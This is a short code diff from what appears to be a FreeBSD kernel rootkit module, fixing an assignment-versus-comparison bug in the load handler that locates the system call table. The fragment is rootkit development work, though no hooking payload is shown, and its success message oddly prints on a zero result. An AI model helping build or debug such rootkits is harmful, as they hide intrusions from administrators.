@@ -64,7 +64,7 @@ static int rootkit_handler(struct module *module, int event, void *arg) {
     switch (event) {
     case MOD_LOAD:
         search_table_case = find_sysent_table();
-        if (search_table_case = 0) {
+        if (search_table_case == 0) {
             uprintf("No error with finding sysent table address.\n");
         }
         else {
